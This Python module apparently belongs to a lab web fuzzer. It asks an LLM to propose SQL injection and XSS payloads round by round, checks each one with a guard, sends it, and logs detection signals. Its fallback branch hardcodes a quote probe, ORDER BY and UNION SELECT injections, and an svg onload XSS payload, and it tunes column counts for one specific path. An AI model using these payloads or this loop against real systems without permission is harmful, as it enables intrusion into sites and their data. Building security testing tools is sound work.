from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Callable, List
from uuid import uuid4

from aitool.api_client import AiApiClient, ChatMessage
from fuzztool.http_client import FuzzHttpClient, RequestBudgetExceeded
from fuzztool.models import FuzzTarget
from fuzztool.mutator import RequestMutator

from .payload_guard import PayloadGuard
from .response_summarizer import ResponseSummarizer


@dataclass
class AiPayloadDecision:
    payload: str = ""
    attack_type: str = "unknown"
    reason: str = ""
    expected_signal: str = ""
    stop: bool = False
    source: str = "ai"


class AiIterativeSessionRunner:
    """Luồng cơ bản: baseline -> AI payload -> guard -> request -> detect."""

    def __init__(
        self,
        tool_config: dict,
        ai_config: dict,
        on_round: Callable[[dict], None] | None = None,
    ) -> None:
        self.on_round = on_round
        self.ai_api = AiApiClient(ai_config)
        safety = tool_config.get("safety", {})
        self.client = FuzzHttpClient(
            headers=tool_config.get("headers", {}),
            max_requests=int(safety.get("max_requests", 100)),
            delay_seconds=float(safety.get("delay_seconds", 0.05)),
            timeout=int(safety.get("request_timeout_seconds", 15)),
            use_environment_proxy=bool(safety.get("use_environment_proxy", False)),
        )
        self.mutator = RequestMutator()
        self.guard = PayloadGuard()
        self.summarizer = ResponseSummarizer()

    def run_targets(self, targets: List[FuzzTarget], rounds: int) -> List[dict]:
        total = len(targets)
        return [self.run_one_target(target, rounds, index, total) for index, target in enumerate(targets, start=1)]

    def run_one_target(self, target: FuzzTarget, rounds: int, index: int, total: int) -> dict:
        marker = f"AITEST_{uuid4().hex[:8]}"
        baseline = self._send_request(target, marker)
        session = {
            "target": self._target_dict(target),
            "marker": marker,
            "baseline": baseline,
            "rounds": [],
            "confirmed_signals": [],
        }

        previous_rounds: List[dict] = []

        for round_number in range(1, rounds + 1):
            decision = self._ask_ai_or_fallback(target, marker, baseline, previous_rounds)

            if decision.stop:
                item = {
                    "round": round_number,
                    "stopped_by_ai": True,
                    "attack_type": decision.attack_type,
                    "payload": "",
                    "reason": decision.reason,
                }
                session["rounds"].append(item)
                self._emit_table_row(target, index, total, round_number, decision, "-", False, "stopped_by_ai")
                break

            check = self.guard.check(decision.payload)
            if not check.allowed:
                item = {
                    "round": round_number,
                    "payload": decision.payload,
                    "attack_type": decision.attack_type,
                    "reason": decision.reason,
                    "guard": f"blocked: {check.reason}",
                }
                session["rounds"].append(item)
                self._emit_table_row(target, index, total, round_number, decision, "-", False, item["guard"])
                break

            response = self._send_request(target, marker, decision.payload)
            signals = response.get("signals", {})
            confirmed = bool(signals.get("confirmed_signal"))

            item = {
                "round": round_number,
                "payload": decision.payload,
                "attack_type": decision.attack_type,
                "reason": decision.reason,
                "expected_signal": decision.expected_signal,
                "guard": check.reason,
                "response": response,
            }
            session["rounds"].append(item)
            previous_rounds.append(item)

            if confirmed:
                session["confirmed_signals"].append(
                    {
                        "round": round_number,
                        "attack_type": decision.attack_type,
                        "signals": signals,
                    }
                )

            self._emit_table_row(
                target,
                index,
                total,
                round_number,
                decision,
                response.get("status", "-"),
                confirmed,
                self._comment(signals),
            )

        return session

    def _send_request(self, target: FuzzTarget, marker: str, payload: str | None = None) -> dict:
        try:
            if payload is None:
                method, url, body, headers = self.mutator.baseline(target)
            else:
                method, url, body, headers = self.mutator.mutate(target, payload)
            response = self.client.send(method, url, body=body, headers=headers)
            return self.summarizer.summarize(response, marker)
        except RequestBudgetExceeded as error:
            return {"status": 0, "error": str(error), "signals": {"confirmed_signal": False}}

    def _ask_ai_or_fallback(
        self,
        target: FuzzTarget,
        marker: str,
        baseline: dict,
        previous_rounds: List[dict],
    ) -> AiPayloadDecision:
        try:
            raw = self.ai_api.complete(
                [
                    ChatMessage(role="system", content="Bạn là AI hỗ trợ test XSS/SQLi trong lab. Chỉ trả JSON."),
                    ChatMessage(role="user", content=self._prompt(target, marker, baseline, previous_rounds)),
                ]
            )
            return self._parse_ai_response(raw)
        except Exception as error:
            return self._fallback_payload(target, marker, len(previous_rounds) + 1, f"AI fallback: {error}")

    def _prompt(self, target: FuzzTarget, marker: str, baseline: dict, previous_rounds: List[dict]) -> str:
        data = {
            "task": "Đề xuất đúng 1 payload tiếp theo.",
            "rules": [
                "Chỉ trả JSON.",
                "Không dùng payload phá hoại dữ liệu hoặc hệ thống.",
                "UNION nên dùng marker theo cột: MARKER_C01, MARKER_C02...",
                "Nếu không cần test tiếp thì stop=true.",
            ],
            "expected_json": {
                "payload": "string",
                "attack_type": "sqli_error|sqli_order_by|sqli_union|xss_reflection|stop",
                "reason": "lý do chọn payload",
                "expected_signal": "dấu hiệu mong đợi",
                "stop": False,
            },
            "marker": marker,
            "target": self._target_dict(target),
            "baseline": {
                "status": baseline.get("status"),
                "content_type": baseline.get("content_type"),
                "response_length": baseline.get("response_length"),
                "signals": baseline.get("signals", {}),
                "excerpt": str(baseline.get("excerpt", ""))[:700],
            },
            "previous_rounds": previous_rounds[-3:],
        }
        return json.dumps(data, ensure_ascii=False)

    def _parse_ai_response(self, raw_text: str) -> AiPayloadDecision:
        data = self._extract_json(raw_text)
        if isinstance(data.get("payloads"), list) and data["payloads"]:
            data = data["payloads"][0]
        return AiPayloadDecision(
            payload=str(data.get("payload", "")),
            attack_type=str(data.get("attack_type", "unknown")),
            reason=str(data.get("reason", "")),
            expected_signal=str(data.get("expected_signal", "")),
            stop=bool(data.get("stop", False)),
        )

    def _extract_json(self, raw_text: str) -> dict:
        text = (raw_text or "").strip()
        if not text:
            raise ValueError("empty AI response")
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            start = text.find("{")
            end = text.rfind("}")
            if start < 0 or end <= start:
                raise ValueError("AI response has no JSON") from None
            return json.loads(text[start : end + 1])

    def _fallback_payload(self, target: FuzzTarget, marker: str, round_number: int, reason: str) -> AiPayloadDecision:
        sample = target.sample_value
        name = target.param_name.lower()
        is_sqli = target.type_hint in {"int", "float"} or name == "id" or name.endswith("_id")

        if is_sqli:
            if round_number == 1:
                return AiPayloadDecision(f"{sample}'", "sqli_error", reason, "SQL error", source="fallback")
            if round_number == 2:
                return AiPayloadDecision(f"{sample} ORDER BY 12-- -", "sqli_order_by", reason, "SQL error", source="fallback")
            if round_number == 3:
                column_count = 11 if target.path.lower().endswith("/api/spa/news.php") else 14
                columns = self._union_columns(marker, column_count)
                return AiPayloadDecision(f"-1 UNION SELECT {columns}-- -", "sqli_union", reason, "marker rendered", source="fallback")
            return AiPayloadDecision(stop=True, attack_type="stop", reason="fallback đã thử đủ vòng", source="fallback")

        if round_number == 1:
            payload = f'"><svg/onload=alert("{marker}")>'
            return AiPayloadDecision(payload, "xss_reflection", reason, "marker reflected", source="fallback")
        return AiPayloadDecision(stop=True, attack_type="stop", reason="fallback đã thử đủ vòng", source="fallback")

    def _union_columns(self, marker: str, count: int) -> str:
        return ",".join(f"'{marker}_C{index:02d}'" for index in range(1, count + 1))

    def _comment(self, signals: dict) -> str:
        if signals.get("sql_error_patterns"):
            return "sql_error:" + ",".join(signals["sql_error_patterns"][:2])
        if signals.get("visible_columns"):
            return "union_visible:C" + ",C".join(signals["visible_columns"][:8])
        if signals.get("matched_paths"):
            return "marker_json:" + ",".join(signals["matched_paths"][:3])
        if signals.get("marker_in_html"):
            return "marker_rendered_html"
        return "no_signal"

    def _emit_table_row(
        self,
        target: FuzzTarget,
        target_index: int,
        target_total: int,
        round_number: int,
        decision: AiPayloadDecision,
        status: object,
        confirmed: bool,
        comment: str,
    ) -> None:
        if self.on_round:
            self.on_round(
                {
                    "target_index": target_index,
                    "target_total": target_total,
                    "round": round_number,
                    "target": target,
                    "attack_type": decision.attack_type,
                    "source": decision.source,
                    "payload": decision.payload,
                    "reason": decision.reason,
                    "status": status,
                    "confirmed": confirmed,
                    "comment": comment,
                }
            )

    def _target_dict(self, target: FuzzTarget) -> dict:
        return {
            "method": target.method,
            "url": target.url,
            "path": target.path,
            "param": target.param_name,
            "location": target.param_location,
            "type_hint": target.type_hint,
            "sample_value": target.sample_value,
        }
